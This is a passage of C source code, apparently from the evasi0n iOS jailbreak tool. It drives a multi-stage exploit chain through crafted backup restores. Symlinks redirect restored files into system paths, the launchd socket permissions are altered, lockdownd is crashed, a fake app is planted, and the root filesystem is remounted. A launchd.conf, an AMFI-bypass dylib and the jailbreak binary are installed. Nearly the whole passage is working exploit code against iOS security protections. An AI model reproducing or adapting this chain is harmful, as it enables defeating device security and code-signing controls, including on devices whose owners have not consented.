            device = NULL;

            // device reboot
            if(reboot_device(udid) != 0)
            {
                    errmsg(localize("Your device appears to be using a semi-tether jailbreak. Please use the evasi0n untether package from Cydia to untether instead."));
                    return -1;
            }

            // wait for device reboot
            progress_msg(1, localize("Waiting for device reboot..."));
            int maxwait = 60;
            while (device_connected && (maxwait-- >= 0)) {
                    if (!device_connected) {
                            break;
                    }
                    sleep(2);
            }
            if (device_connected) {
                    errmsg(localize("Device did not reboot?!"));
                    return -1;
            }
            maxwait = 120;
            while (!device_connected && (maxwait-- >= 0)) {
                    if (device_connected) {
                            break;
                    }
                    sleep(2);
            }
            if (!device_connected) {
                    errmsg(localize("Device did not reconnect after reboot?!"));
                    return -1;
            }

            progress_msg(1, localize("Waiting for device to be ready..."));

            // device rebooted, wait for springboard to show up
            res = device_wait_for_bootup(udid);
            if (res == 1) {
                    res = 0;
                    // let's wait some extra 10 seconds
                    sleep(10);
            } else if (res == 0) {
                    fprintf(stderr, "hm springboard didn't seem to load, trying to continue\n");
            } else {
                    errmsg("error code %d waiting for springboard to show up", res);
                    return res;
            }

            idevice_new(&device, udid);
            if (!device) {
                errmsg(localize("Could not connect to device!"));
                return -1;
            }
        }

	char path[512];
	get_tmpdir(path);
	rmdir_recursive(path);
	mkdir_with_parents(path, 0755);

	// 1.1 Initial Backup
#if 0
	// make backup dir
	char BKPTMP[512];
	strcpy(BKPTMP, path);
	strcat(BKPTMP, "backup");
	mkdir_with_parents(BKPTMP, 0755);

	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	progress_msg(1, localize("Creating backup..."));
	char *bargv[] = {
		"idevicebackup2",
		"--udid",
		(char*)udid,
		"backup",
		BKPTMP,
		NULL
	};
	int bargc = 5;
	idevicebackup2_set_ignore_error(0);
	res = idevicebackup2(bargc, bargv);
	if (res != 0) {
		errmsg(localize("Could not create backup."));
		return res;
	}
#endif
	progress_msg(2, localize("Retrieving information from the device to generate jailbreak data..."));

	// 1.2 fetch /private/var/mobile/Library/Caches/com.apple.mobile.installation.plist
	plist_t instplist = fetch_installation_plist(device);
	if (!instplist) {
		errmsg(localize("Could not get com.apple.mobile.installation.plist"));
		return -1;
	}

	// 1.3 modify com.apple.mobile.installation.plist so that its DemoApp has the hidden tag removed and pointing to /private/var/mobile/DemoApp.app instead of /Applications/DemoApp.app and with LAUNCHD_SOCKET=/private/var/tmp/launchd/sock added to EnvironmentVariables
	modify_installation_plist(&instplist);
	char* modinstplist = NULL;
	uint32_t modinstplen = 0;
	plist_to_bin(instplist, &modinstplist, &modinstplen);
	if (!modinstplist) {
		errmsg(localize("Could not get binary plist blob"));
		return -1;
	}

	// 2. Add fake app
	progress_msg(5, localize("Preparing stage 1 jailbreak data..."));

	// first, we make a 'working copy' of the original backup folder. we don't need much files at all :)
	char HKPTMP[512];
	strcpy(HKPTMP, path);
	strcat(HKPTMP, "hackup/");
	strcat(HKPTMP, udid);
	rmdir_recursive(HKPTMP);
	mkdir_with_parents(HKPTMP, 0755);

	char dstf[512];

	// create Manifest.plist
	strcpy(dstf, HKPTMP);
	strcat(dstf, "/Manifest.plist");

	plist_t dict = plist_new_dict();
	plist_dict_insert_item(dict, "Applications", plist_new_array());
	plist_dict_insert_item(dict, "BackupKeyBag", plist_new_data((char*)backup_kbag, sizeof(backup_kbag)));
	plist_dict_insert_item(dict, "Date", plist_new_date(time(NULL), 0));
	plist_dict_insert_item(dict, "IsEncrypted", plist_new_bool(0));
	plist_t lckd = plist_new_dict();
	plist_dict_insert_item(lckd, "BuildVersion", pl_build);
	plist_dict_insert_item(lckd, "DeviceName", pl_devname);
	plist_dict_insert_item(lckd, "ProductType", pl_ptype);
	plist_dict_insert_item(lckd, "ProductVersion", pl_pver);
	plist_dict_insert_item(lckd, "SerialNumber", pl_snum);
	plist_dict_insert_item(lckd, "UniqueDeviceID", plist_new_string(udid));

	plist_t ccdict = plist_new_dict();
	plist_dict_insert_item(ccdict, "ShouldSubmit", plist_new_bool(0));
	plist_dict_insert_item(lckd, "com.apple.MobileDeviceCrashCopy", ccdict);

	plist_t ibdict = plist_new_dict();
	char hostname[256];
#ifdef WIN32
	WSADATA wsa_data;
	WSAStartup(MAKEWORD(2,2), &wsa_data);
#endif
	if (gethostname(hostname, 256) != 0) {
		strcpy(hostname, "localhost");
	}
	plist_dict_insert_item(ibdict, "LastBackupComputerName", plist_new_string(hostname));
#ifdef WIN32
	plist_dict_insert_item(ibdict, "LastBackupComputerType", plist_new_string("Windows"));
#else
	plist_dict_insert_item(ibdict, "LastBackupComputerType", plist_new_string("Mac"));
#endif
	plist_dict_insert_item(lckd, "com.apple.iTunes.backup", ibdict);

	plist_dict_insert_item(dict, "Lockdown", lckd);
	plist_dict_insert_item(dict, "SystemDomainsVersion", plist_new_string("16.0"));
	plist_dict_insert_item(dict, "Version", plist_new_string("9.1"));
	plist_dict_insert_item(dict, "WasPasscodeSet", plist_new_bool(0));

	if (plist_write_to_file(dict, dstf, 1) < 0) {
		return -1;
	}
	plist_free(dict);

	// create Status.plist
	strcpy(dstf, HKPTMP);
	strcat(dstf, "/Status.plist");

	dict = plist_new_dict();
	plist_dict_insert_item(dict, "BackupState", plist_new_string("new"));
	plist_dict_insert_item(dict, "Date", plist_new_date(time(NULL), 0));
	plist_dict_insert_item(dict, "IsFullBackup", plist_new_bool(1));
	plist_dict_insert_item(dict, "SnapshotState", plist_new_string("finished"));
	char* backup_uuid = gen_uuid();
	plist_dict_insert_item(dict, "UUID", plist_new_string(backup_uuid));
	free(backup_uuid);
	plist_dict_insert_item(dict, "Version", plist_new_string("2.4"));

	if (plist_write_to_file(dict, dstf, 1) < 0) {
		return -1;
	}
	plist_free(dict);


	// write empty mbdb file
	strcpy(dstf, HKPTMP);
	strcat(dstf, "/Manifest.mbdb");

	if (file_write(dstf, (unsigned char*)"mbdb\5\0", 6) < 0) {
		errmsg("Could not write file '%s'!", dstf);
		return -1;
	}

	strcpy(HKPTMP, path);
	strcat(HKPTMP, "hackup");

	// open tiny backup
	backup_t* backup = backup_open(HKPTMP, udid);
	if (!backup) {
		errmsg(localize("ERROR: could not open backup"));
		return -1;
	}

	backup_file_t* bf;

	if (backup_add_directory(backup, "MediaDomain", "Media", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}

	// *** magic symlink
	if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/var/mobile", 501, 501) < 0) {
		errmsg(localize("Couldn't add file to backup"));
		return -1;
	}

	// *** Create directory /private/var/mobile/DemoApp.app
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}

        const void* localized_demo_app_info_plist = NULL;
        size_t localized_demo_app_info_plist_size = 0;
        localize_demo_app(&localized_demo_app_info_plist, &localized_demo_app_info_plist_size);

	// *** Write basic /private/var/mobile/DemoApp.app/Info.plist
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app/Info.plist", 0644, 501, 501, 4, localized_demo_app_info_plist, localized_demo_app_info_plist_size) < 0) {
		errmsg(localize("Couldn't add Info.plist to backup"));
		return -1;
	}

	// *** Write shebang /private/var/mobile/DemoApp.app/DemoApp
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app/DemoApp", 0755, 501, 501, 4, shebang, sizeof(shebang)) < 0) {
		errmsg(localize("Couldn't add executable to backup"));
		return -1;
	}

	// *** add icons
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app/Icon.png", 0644, 501, 501, 4, icon_png, sizeof(icon_png)) < 0) {
		errmsg(localize("Couldn't add Icon.png to backup"));
		return -1;
	}
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app/Icon@2x.png", 0644, 501, 501, 4, icon_2x_png, sizeof(icon_2x_png)) < 0) {
		errmsg(localize("Couldn't add Icon@2x.png to backup"));
		return -1;
	}
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app/Icon-72.png", 0644, 501, 501, 4, icon_72_png, sizeof(icon_72_png)) < 0) {
		errmsg(localize("Couldn't add Icon-72.png to backup"));
		return -1;
	}
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/DemoApp.app/Icon-72@2x.png", 0644, 501, 501, 4, icon_72_2x_png, sizeof(icon_72_2x_png)) < 0) {
		errmsg(localize("Couldn't add Icon-72@2x.png to backup"));
		return -1;
	}

	// *** Write back modified com.apple.mobile.installation.plist
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/Library/Caches/com.apple.mobile.installation.plist", 0100644, 501, 501, 4, (unsigned char*)modinstplist, modinstplen) < 0) {
		errmsg(localize("Couldn't add install plist to backup"));
		return -1;
	}

	// *** Trash /var/mobile/Library/Caches/com.apple.LaunchServices-*.csstore files
	int i;
	for (i = 0; i < num_csstores; i++) {
		char bkfname[512];
		sprintf(bkfname, "Media/Recordings/.haxx/Library/Caches/com.apple.LaunchServices-%03d.csstore", csstores[i]);
		if (backup_add_file_with_data(backup, "MediaDomain", bkfname, 0644, 501, 501, 4, (const unsigned char*)"Eat this!", 9) < 0) {
			errmsg(localize("Couldn't add csstore to backup"));
			return -1;
		}
	}

	// *** save backup ***
	backup_write_mbdb(backup);
	backup_free(backup);

	// 3. restore the backup
	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	progress_msg(10, localize("Injecting stage 1 jailbreak data..."));
	char* rargv[] = {
		"idevicebackup2",
		"--udid",
		(char*)udid,
		"restore",
		"--system",
		"--settings",
		HKPTMP,
		NULL
	};
	int rargc = 7;
	idevicebackup2_set_ignore_error(102);
	res = idevicebackup2(rargc, rargv);
	if (res != 0) {
		errmsg("hmm... restore failed (%d)?!", res);
		return res;
	}

	// remove /var/backup
	trash_var_backup(HKPTMP, udid);

	// device reboot
	if(reboot_device(udid) != 0)
        {
                errmsg(localize("Your device appears to be using a semi-tether jailbreak. Please use the evasi0n untether package from Cydia to untether instead."));
                return -1;
        }

	// wait for device reboot
	progress_msg(10, localize("Waiting for device reboot... (Do not touch your device)"));
	int maxwait = 60;
	while (device_connected && (maxwait-- >= 0)) {
		if (!device_connected) {
			break;
		}
		sleep(2);
	}
	if (device_connected) {
		errmsg(localize("Device did not reboot?!"));
		return -1;
	}
	maxwait = 120;
	while (!device_connected && (maxwait-- >= 0)) {
		if (device_connected) {
			break;
		}
		sleep(2);
	}
	if (!device_connected) {
		errmsg(localize("Device did not reconnect after reboot?!"));
		return -1;
	}

        progress_msg(13, localize("Waiting for device to be ready... (Do not touch your device)"));

	// device rebooted, wait for springboard to show up
	res = device_wait_for_bootup(udid);
	if (res == 1) {
		res = 0;
		// let's wait some extra 10 seconds
		sleep(10);
	} else if (res == 0) {
		fprintf(stderr, "hm springboard didn't seem to load, trying to continue\n");
	} else {
		errmsg("error code %d waiting for springboard to show up", res);
		return res;
	}

	progress_msg(15, localize("Preparing stage 2 jailbreak data... (Do not touch your device)"));

	strcpy(dstf, HKPTMP);
	strcat(dstf, "/");
	strcat(dstf, udid);
	strcat(dstf, "/Manifest.mbdb");

	if (file_write(dstf, (unsigned char*)"mbdb\5\0", 6) < 0) {
		errmsg("Could not write file '%s'!", dstf);
		return -1;
	}

	backup = backup_open(HKPTMP, udid);
	if (!backup) {
		errmsg(localize("ERROR: could not open backup"));
		return -1;
	}

	if (backup_add_directory(backup, "MediaDomain", "Media", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}

	// *** magic symlink
	if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/var/db/", 501, 501) < 0) {
		errmsg(localize("Couldn't add file to backup"));;
		return -1;
	}

	// 4.1 chmod 777 /private/var/tmp/launchd
	if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx/timezone", "/var/tmp/launchd", 0, 0) < 0) {
		errmsg(localize("Couldn't add file to backup"));
		return -1;
	}
	backup_write_mbdb(backup);

	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	progress_msg(20, localize("Injecting stage 2 jailbreak data (step 1/3)... (Do not touch your device)"));
	char* nrargv[] = {
		"idevicebackup2",
		"--udid",
		(char*)udid,
		"restore",
		"--system",
		"--settings",
		HKPTMP,
		NULL
	};
	int nrargc = 7;
	idevicebackup2_set_ignore_error(0);
	res = idevicebackup2(nrargc, nrargv);
	if (res != 0) {
		fprintf(stderr, "Warning: unexpected error while restoring stage 2 data (1/3)\n");
	}

	crash_lockdown(udid);


	// 4.2 chmod 777 /private/var/tmp/launchd/sock
	res = 0;
	bf = backup_get_file(backup, "MediaDomain", "Media/Recordings/.haxx/timezone");
        if (bf) {
                backup_file_set_target(bf, "/var/tmp/launchd/sock");
                backup_file_set_mode(bf, 0120644);
                backup_file_set_uid(bf, 0);
                backup_file_set_gid(bf, 0);
                unsigned int tm = (unsigned int)(time(NULL));
                backup_file_set_time1(bf, tm);
                backup_file_set_time2(bf, tm);
                backup_file_set_time3(bf, tm);
                backup_file_set_flag(bf, 0);

                if (backup_update_file(backup, bf) < 0) {
                        res = -1;
                }
                backup_file_free(bf);
        }
	if (res < 0) {
		errmsg(localize("Could not add file to backup"));
	}
	backup_write_mbdb(backup);

	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	progress_msg(25, localize("Injecting stage 2 jailbreak data (step 2/3)... (Do not touch your device)"));

	idevicebackup2_set_ignore_error(102);
	res = idevicebackup2(nrargc, nrargv);
	if (res != 0) {
		fprintf(stderr, "Warning: unexpected error while restoring stage 2 data (2/3)\n");
	}

	crash_lockdown(udid);


	// remove timezone symlink
	res = -1;
	bf = backup_get_file(backup, "MediaDomain", "Media/Recordings/.haxx/timezone");
        if (bf) {
                backup_file_set_target_with_length(bf, "\0", 1);
                backup_file_set_mode(bf, 0120644);
                backup_file_set_uid(bf, 0);
                backup_file_set_gid(bf, 0);
                unsigned int tm = (unsigned int)(time(NULL));
                backup_file_set_time1(bf, tm);
                backup_file_set_time2(bf, tm);
                backup_file_set_time3(bf, tm);
                backup_file_set_flag(bf, 0);

                if (backup_update_file(backup, bf) < 0) {
			res = -1;
		} else {
			res = 0;
		}
                backup_file_free(bf);
        }
	if (res < 0) {
		errmsg(localize("Couldn't add file to backup!"));
		return -1;
	}

	backup_write_mbdb(backup);
	backup_free(backup);

	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	progress_msg(30, localize("Injecting stage 2 jailbreak data (step 3/3)... (Do not touch your device)"));

	idevicebackup2_set_ignore_error(102);
	res = idevicebackup2(nrargc, nrargv);
	if (res != 0) {
		fprintf(stderr, "Warning: unexpected error while restoring stage 2 data (3/3)\n");
	}

	device = NULL;
	idevice_new(&device, udid);
	if (!device) {
		errmsg(localize("failed to connect to device :("));
		return -1;
	}
	lockdown = NULL;
	lockdownd_client_new_with_handshake(device, &lockdown, NULL);
	if (!lockdown) {
		idevice_free(device);
		device = NULL;
		errmsg(localize("failed to connect to lockdownd :("));
		return -1;
	}
	uint16_t port = 0;
	lockdownd_start_service(lockdown, "com.apple.afc", &port);
	lockdownd_client_free(lockdown);
	lockdown = NULL;

	afc_client_t afc = NULL;
	afc_client_new(device, port, &afc);
	if (!afc) {
		errmsg(localize("failed to connect to AFC"));
		idevice_free(device);
		device = NULL;
		return -1;
	}

        if(afc_make_directory(afc, "/evasi0n-install") != AFC_E_SUCCESS)
        {
            errmsg(localize("failed to make directory"));
            afc_client_free(afc);
            idevice_free(device);
            device = NULL;
            return -1;
        }

        size_t cydia_size = compressed_data_size(cydia_compressed_data, cydia_compressed_size);
        size_t packagelist_size = compressed_data_size(packagelist_compressed_data, packagelist_compressed_size);
        size_t extras_size = sizeof(extras_tar);

        if(cydia_size == -1 || packagelist_size == -1)
        {
            errmsg(localize("failed to get data files"));
            afc_client_free(afc);
            idevice_free(device);
            device = NULL;
            return -1;
        }

        float cydia_start_percentage = 50.0f;
        float packagelist_start_percentage = 50.0f + ((74.0f - 50.0f) * ((float) cydia_size / (float)(cydia_size + packagelist_size + extras_size)));
        float extras_start_percentage = packagelist_start_percentage + ((74.0f - 50.0f) * ((float) packagelist_size / (float)(cydia_size + packagelist_size + extras_size)));

        struct afc_upload_callback_context callback_context;
        callback_context.start_percentage = cydia_start_percentage;
        callback_context.stop_percentage = packagelist_start_percentage;

	progress_msg(callback_context.start_percentage, localize("Uploading Cydia... (Do not touch your device)"));
        if(afc_upload_compressed_data(afc, "/evasi0n-install/Cydia.tar", cydia_compressed_data, cydia_compressed_size, afc_default_upload_callback, &callback_context) != AFC_E_SUCCESS)
        {
            errmsg(localize("failed to upload file"));
            afc_client_free(afc);
            idevice_free(device);
            device = NULL;
            return -1;
        }

        callback_context.start_percentage = packagelist_start_percentage;
        callback_context.stop_percentage = extras_start_percentage;

	progress_msg(callback_context.start_percentage, localize("Uploading Cydia packages list... (Do not touch your device)"));
        if(afc_upload_compressed_data(afc, "/evasi0n-install/packagelist.tar", packagelist_compressed_data, packagelist_compressed_size, afc_default_upload_callback, &callback_context) != AFC_E_SUCCESS)
        {
            errmsg(localize("failed to upload file"));
            afc_client_free(afc);
            idevice_free(device);
            device = NULL;
            return -1;
        }

        callback_context.start_percentage = extras_start_percentage;
        callback_context.stop_percentage = 74.0f;

	progress_msg(callback_context.start_percentage, localize("Uploading extra packages... (Do not touch your device)"));
        if(afc_upload_data(afc, "/evasi0n-install/extras.tar", extras_tar, extras_size, afc_default_upload_callback, &callback_context) != AFC_E_SUCCESS)
        {
            errmsg(localize("failed to upload file"));
            afc_client_free(afc);
            idevice_free(device);
            device = NULL;
            return -1;
        }

	afc_remove_path(afc, "/mount.stderr");
	afc_remove_path(afc, "/mount.stdout");

	// 5. remount /
	// - Have user tap DemoApp icon
	progress_msg(75, localize("To continue, please unlock your device and tap the new 'Jailbreak' icon. Only tap it once! The screen will go black and then return to the home screen."));
	request_user_attention(2);

	// wait for the mount.stderr file to appear. this means that the user apparently tapped on the icon.
	int done = 0;
	while (1) {
		char** fi = NULL;
		if (afc_get_file_info(afc, "/mount.stderr", &fi) == AFC_E_SUCCESS) {
			done = 1;
			free_dictionary(fi);
			break;
		}
		sleep(2);
	}
	cancel_user_attention();
	if (!done) {
		progress_msg(80, localize("Timeout waiting for user to tap on the icon... trying to continue anyway..."));
	} else {
		progress_msg(80, localize("Alright! Remounting will start now. Do NOT tap the icon again -- just wait."));
	}

	strcpy(dstf, HKPTMP);
	strcat(dstf, "/");
	strcat(dstf, udid);
	strcat(dstf, "/Manifest.mbdb");

	if (file_write(dstf, (unsigned char*)"mbdb\5\0", 6) < 0) {
		errmsg("Could not write file '%s'!", dstf);
		return -1;
	}

	backup = backup_open(HKPTMP, udid);
	if (!backup) {
		errmsg(localize("ERROR: could not open backup"));
		return -1;
	}

	if (backup_add_directory(backup, "MediaDomain", "Media", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}

	if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/var", 501, 501) < 0) {
		errmsg(localize("Error: Couldn't add file to backup!"));
		return -1;
	}

	// restore /var/db/timezone folder
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings/.haxx/db/timezone", 0777, 0, 0) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}

	// - Replace /private/var/mobile/DemoApp.app/DemoApp with symlink to /
	if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx/mobile/DemoApp.app/DemoApp", "/", 0, 0) < 0) {
		errmsg(localize("Error: Couldn't add file to backup!"));
		return -1;
	}

	backup_write_mbdb(backup);
	backup_free(backup);

	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	progress_msg(85, localize("Injecting remount payload..."));

	// same here, ignore error.
	idevicebackup2_set_ignore_error(102);
	res = idevicebackup2(nrargc, nrargv);
	if (res != 0) {
		fprintf(stderr, "Warning: unexpected error while injecting remount payload\n");
	}

	// now we actually wait for the file /mount.stdout to have a size > 0
	maxwait = 30;
	done = 0;
	while (maxwait-- >= 0) {
		char** fi = NULL;
		uint64_t fsize = 0;
		if (afc_get_file_info(afc, "/mount.stdout", &fi) == AFC_E_SUCCESS) {
			int i;
			for (i = 0; fi[i]; i+=2) {
				if (!strcmp(fi[i], "st_size")) {
					fsize = atoll(fi[i+1]);
					break;
				}
			}
			free_dictionary(fi);
			if (fsize > 0) {
				done = 1;
				break;
			}
		}
		sleep(2);
	}
	if (!done) {
		errmsg(localize("Could not remount root filesystem"));
		return -1;
	}

	progress_msg(90, localize("Root Filesystem successfully remounted!"));
	sleep(2);

	progress_msg(95, localize("Preparing final jailbreak data..."));


	// 6. now write all jailbreak data to /var/evasi0n

	strcpy(dstf, HKPTMP);
	strcat(dstf, "/");
	strcat(dstf, udid);
	strcat(dstf, "/Manifest.mbdb");

	if (file_write(dstf, (unsigned char*)"mbdb\5\0", 6) < 0) {
		errmsg("Could not write file '%s'!", dstf);
		return -1;
	}

	backup = backup_open(HKPTMP, udid);
	if (!backup) {
		errmsg(localize("Could not open backup"));
		return -1;
	}

	if (backup_add_directory(backup, "MediaDomain", "Media", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501) < 0) {
		errmsg(localize("Couldn't add dir to backup"));
		return -1;
	}

	if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", "/", 0, 0) < 0) {
		errmsg(localize("Couldn't add file to backup!"));
		return -1;
	}

        // add /private/etc/launchd.conf symlink
        if (backup_add_symlink(backup, "MediaDomain", "Media/Recordings/.haxx/private/etc/launchd.conf", "/private/var/evasi0n/launchd.conf", 501, 501) < 0) {
		errmsg(localize("Couldn't add file to backup"));
		return -1;
	}

	// add /var/evasi0n dir
	if (backup_add_directory(backup, "MediaDomain", "Media/Recordings/.haxx/var/evasi0n", 0755, 0, 0) < 0) {
		errmsg(localize("Couldn't add evasi0n dir"));
		return -1;
	}

	// add /var/evasi0n/evasi0n
        if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/var/evasi0n/evasi0n", 0755, 0, 0, 4, evasi0n_bin, sizeof(evasi0n_bin)) < 0) {
            errmsg(localize("Couldn't add file to backup!"));
            return -1;
        }

	// add /var/evasi0n/amfi.dylib
        if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/var/evasi0n/amfi.dylib", 0644, 0, 0, 4, amfi_dylib, sizeof(amfi_dylib)) < 0) {
            errmsg(localize("Couldn't add file to backup!"));
            return -1;
        }

	// add /var/evasi0n/udid
        if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/var/evasi0n/udid", 0644, 0, 0, 4, (unsigned char*)udid, strlen(udid)) < 0) {
            errmsg(localize("Couldn't add file to backup!"));
            return -1;
        }

	// add /etc/launchd.conf
	if (backup_add_file_with_data(backup, "MediaDomain", "Media/Recordings/.haxx/var/evasi0n/launchd.conf", 0644, 0, 0, 4, etc_launchd_conf, sizeof(etc_launchd_conf)) < 0) {
		errmsg(localize("Error: Couldn't add file to backup!"));
		return -1;
	}

	backup_write_mbdb(backup);
	backup_free(backup);

	if (wait_for_passcode(udid) < 0) {
		return -1;
	}
	progress_msg(97, localize("Injecting final jailbreak data..."));

	idevicebackup2_set_ignore_error(102);
	res = idevicebackup2(nrargc, nrargv);
	if (res != 0) {
		fprintf(stderr, "Warning: unexpected error while restoring stage 3 data\n");
	}

	// remove /var/backup
	trash_var_backup(HKPTMP, udid);

	// 7. reboot (during the reboot Cydia is installed and /var/backup is deleted)
	progress_msg(100, localize("Jailbreak complete! The device may restart a few times as it completes the process."));
	request_user_attention(1);
	reboot_device(udid);

	// 8. Restore original backup
	// not required!

	// cleanup!
	rmdir_recursive(path);

	return res;
}

const char* get_languages_plist()
{
    return (const char*)languages_plist;
}

size_t get_languages_plist_size()
{
    return sizeof(languages_plist);
}
